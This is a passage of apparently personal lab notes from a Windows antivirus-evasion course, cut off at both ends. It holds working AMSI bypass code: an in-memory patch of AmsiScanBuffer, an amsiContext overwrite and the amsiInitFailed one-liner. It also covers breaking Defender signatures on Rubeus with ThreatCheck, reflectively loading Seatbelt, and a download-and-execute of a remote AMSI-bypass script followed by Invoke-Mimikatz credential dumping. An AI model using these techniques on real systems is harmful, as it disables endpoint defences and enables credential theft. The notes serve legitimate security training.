$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
```

![Pasted image 20260720182231.png](/ob/Pasted%20image%2020260720182231.png)

#### Bypass 3: Forcing an Error

```
$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context','NonPublic,Static');
$session = $utils.GetField('amsi'+'Session','NonPublic,Static');

$marshal = [System.Runtime.InteropServices.Marshal];
$newContext = $marshal::AllocHGlobal(4);

$context.SetValue($null,[IntPtr]$newContext);
$session.SetValue($null,$null);
```

#### Task : The file "C:\Alpha\AMSI.ps1" is blocked by Microsoft Defender Antivirus when trying to run it. Bypass AMSI and run the file to get the flag.

```
PS C:\Users\alpha> \Alpha\AMSI.ps1
At C:\Alpha\AMSI.ps1:1 char:1
+ $l3 = "FQwdNgIxGT";
+ ~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

```
PS C:\Users\alpha> [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
PS C:\Users\alpha> \Alpha\AMSI.ps1
5afb0c1409b589b78a7ba8aaef6390d9
```

![Pasted image 20260720183010.png](/ob/Pasted%20image%2020260720183010.png)

### Open-Source Software (Study again )

#### Option 1: Manually Breaking Signatures

The simplest, but also most tedious way of getting open-source software past `Microsoft Defender Antivirus` is by following these steps:

1. Compile the software
2. Use a tool like [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)to to locate which bytes trigger a detection
3. Modify the source code accordingly
4. Repeat until the binary is undetected

Compile the Rubus.exe

![Pasted image 20260721155311.png](/ob/Pasted%20image%2020260721155311.png)

![Pasted image 20260721155420.png](/ob/Pasted%20image%2020260721155420.png)

```
PS C:\Users\test\Desktop> .\ThreatCheck.exe -f .\Rubeus.exe
[+] Target file size: 446976 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x48E3E
00048D3E   74 41 64 64 72 65 73 73  00 5F 70 72 69 6E 74 5F   tAddress._print_
00048D4E   61 64 64 72 65 73 73 00  63 72 6F 73 73 00 75 73   address.cross.us
00048D5E   65 72 53 74 61 74 73 00  47 65 74 41 44 4F 62 6A   erStats.GetADObj
00048D6E   65 63 74 73 00 46 6F 72  67 65 54 69 63 6B 65 74   ects.ForgeTicket
00048D7E   73 00 45 6E 75 6D 65 72  61 74 65 54 69 63 6B 65   s.EnumerateTicke
00048D8E   74 73 00 50 61 72 73 65  53 61 76 65 54 69 63 6B   ts.ParseSaveTick
00048D9E   65 74 73 00 73 61 76 65  54 69 63 6B 65 74 73 00   ets.saveTickets.
00048DAE   43 6F 75 6E 74 4F 66 54  69 63 6B 65 74 73 00 48   CountOfTickets.H
00048DBE   61 72 76 65 73 74 54 69  63 6B 65 74 47 72 61 6E   arvestTicketGran
00048DCE   74 69 6E 67 54 69 63 6B  65 74 73 00 77 72 61 70   tingTickets.wrap
00048DDE   54 69 63 6B 65 74 73 00  64 69 73 70 6C 61 79 4E   Tickets.displayN
00048DEE   65 77 54 69 63 6B 65 74  73 00 72 65 6E 65 77 54   ewTickets.renewT
00048DFE   69 63 6B 65 74 73 00 67  65 74 5F 61 64 64 69 74   ickets.get_addit
00048E0E   69 6F 6E 61 6C 5F 74 69  63 6B 65 74 73 00 73 65   ional_tickets.se
00048E1E   74 5F 61 64 64 69 74 69  6F 6E 61 6C 5F 74 69 63   t_additional_tic
00048E2E   6B 65 74 73 00 67 65 74  5F 74 69 63 6B 65 74 73   kets.get_tickets
```

The ticket is toggle the windows firewall

![Pasted image 20260721155829.png](/ob/Pasted%20image%2020260721155829.png)

Replace all wit tiket

![Pasted image 20260721155931.png](/ob/Pasted%20image%2020260721155931.png)

#### Option 2: Reflectively Loading Assemblies in PowerShell

Since `PowerShell` and `C#` both make use of the `.NET Framework`, it is possible to load `C#` assemblies into memory in `PowerShell` and then interact with them as any other object. This can be done without writing any files to disk, and combined with an `AMSI bypass` makes for a very powerful technique. For example, let's say we have a `C#` assembly which has a namespace called `Example`, which contains a class called `Program`, which contains a method called `Main`. We could load the assembly and execute this method in `PowerShell` like so:

```
powershell
$bin = @(<SNIP>);
[System.Reflection.Assembly]::Load($bin);
[Example.Program]::Main();
```

Let's copy `C:\Tools\Seatbelt` to `C:\Tools\Seatbelt-PS`, and open the project in `Visual Studio`. In order for `PowerShell` to be able to interact with methods from reflectively-loaded assemblies, they need to have `public` visibility. In our case, we'll need to open `Program.cs` and change the `Main` method from `private` to `public`.

![Pasted image 20260721161959.png](/ob/Pasted%20image%2020260721161959.png)

![Pasted image 20260721162055.png](/ob/Pasted%20image%2020260721162055.png)

With that done, we can switch from `Debug` to `Release` mode and build the solution. This will generate a file inside `C:\Tools\Seatbelt-PS\Seatbelt\bin\Release`. When we write our `PowerShell` script, we will need to store this assembly in a variable, so let's use [CyberChef](https://gchq.github.io/CyberChef/#recipe=Gzip\('Dynamic%20Huffman%20Coding','','',false\)To_Base64\('A-Za-z0-9%2B/%3D'\)) to compress and encode it with `GZIP` and `Base64` respectively.

go to https://gchq.github.io/CyberChef/#recipe=Gzip('Dynamic%20Huffman%20Coding','','',false)To\_Base64('A-Za-z0-9%2B/%3D')

![Pasted image 20260721163001.png](/ob/Pasted%20image%2020260721163001.png)

![Pasted image 20260721163020.png](/ob/Pasted%20image%2020260721163020.png)

PS C:\Users\test\Desktop> notepad.exe Invoke-Seatbelt.ps1

```
function Invoke-Seatbelt {
    [CmdletBinding()]
    Param (
        [String]
        $args = " "
    )

    # Seatbelt.exe -> Gzip -> Base64
    $gzipB64 = "<SNIP>";
}
```

![Pasted image 20260721163425.png](/ob/Pasted%20image%2020260721163425.png)

![Pasted image 20260721163547.png](/ob/Pasted%20image%2020260721163547.png)

```
PS C:\Users\test\Desktop> Set-ExecutionPolicy Bypass -Scope Process -Force
PS C:\Users\test\Desktop> .\Invoke-Seatbelt.ps1
PS C:\Users\test\Desktop>
```

this error happens because `AMSI` detects the `.NET assembly` when we call `[System.Reflection.Assembly]::Load()`. This happens, because this specific `AMSI bypass` utilized only disables `AMSI` for the `PowerShell` session. So with that in mind, we need to pick a `bypass` which patches `amsi.dll`, such as the second one we looked at. After making this switch, we can see that we got `Seatbelt` running relatively simply with `Real-time protection` turned on.

### mimikatz

I can run it as normal user

```
PS C:\Users\test\Desktop> $wc = New-Object Net.WebClient;
PS C:\Users\test\Desktop> $wc.DownloadString('https://github.com/AnandJogawade/RedTeam-PowerShell-AMSI-Bypass/releases/download/AMSI-Bypass-Scripts/AMSI-Bypass-3.ps1')   | IEX
AMSI Bypass Patch Applied Successfully!
```

```
PS C:\Users\test\Desktop> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1" -OutFile "IM.ps1"
```

```
PS C:\Users\test\Desktop> Set-ExecutionPolicy Bypass -Scope Process -Force
PS C:\Users\test\Desktop> . .\IM.ps1
PS C:\Users\test\Desktop> Invoke-Mimikatz -DumpCreds
Hostname: DESKTOP-ACG20IL / S-1-5-21-2791164455-3680638696-2278932039

  .#####.   mimikatz 2.2.0 (x64) #19041 Apr 18 2024 16:16:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz(powershell) # exit
Bye!
```

![Pasted image 20260722193618.png](/ob/Pasted%20image%2020260722193618.png)

### User Account Control

#### Setting the UAC

#### Bypass 1: DiskCleanup Scheduled Task Hijack

#### Bypass 2: FodHelper Execution Hijack

#### https://github.com/rootm0s/WinPwnage

CAPE
